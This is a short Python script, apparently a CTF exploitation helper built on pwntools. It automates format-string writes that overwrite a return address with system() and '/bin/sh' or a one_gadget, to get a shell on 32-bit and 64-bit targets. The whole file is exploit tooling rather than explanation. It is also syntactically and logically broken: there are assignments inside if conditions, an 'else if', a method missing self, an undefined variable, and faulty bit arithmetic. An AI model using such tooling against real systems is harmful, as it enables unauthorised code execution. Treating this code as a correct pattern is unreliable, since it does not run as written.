#!/usr/bin/env python
from pwnlib.fmtstr import *
class autofmt():
    def __init__(self,is_stack):
        if is_stack:
            self.fmtobj=FmtStr(execute_fmt)
        else:
            self.fmtobj=None
        if context.arch="amd64":
            self.addr_len=8
        else if context.arch="i386":
            self.addr_len=4
        else:
            print "we now can not support this Architecture"
    def stack_32(self,ret_addr,system_addr,bin_sh_addr):
        self.fmtobj.write(ret_addr,system_addr)
        self.fmtobj.write(ret_addr+4,bin_sh_addr)
        self.fmtobj.write(ret_addr+8,0)
        self.fmtobj.execute_writes()
    def stack_64(self,ret_addr,one_gadget,rsi_addr):
        self.fmtobj.write(ret_addr,one_gadget)
        self.fmtobj.write(rsi_addr,0)
        self.fmtobj.execute_writes()
    def bss_32(self,stack_1_offset,stack_2_offset,ret_addr,system_addr,bin_sh_addr):
        self.write_addr(stack_1_offset,stack_2_offset,ret_addr,system_addr)
        self.write_addr(stack_1_offset,stack_2_offset,ret_addr+4,bin_sh_addr)
        self.write_addr(stack_1_offset,stack_2_offset,ret_addr+8,0)
    def bss_64(self,stack_1_offset,stack_2_offset,ret_addr,one_gadget,rsi_offset):
        self.write_addr(stack_1_offset,stack_2_offset,ret_addr,one_gadget)
        self.write_addr(stack_1_offset,stack_2_offset,ret_addr+ret_offset*self.addr_len,0)
    def execute_fmt(payload):
        io.s(payload)
        return io.ru('\n')
    def write_addr(self,stack_1_offset,stack_2_offset,addr,data):
            for i in range(self.addr_len/2):
                payload,data=fmtstr_split(stack_1_offset,{0:addr&0xffff+i*2},write_size_max='short')
                execute_fmt(payload)
                payload,data=fmtstr_split(stack_2_offset,{0:(data&(0xffff<<i*16))>>16},write_size_max='short')
                execute_fmt(payload)


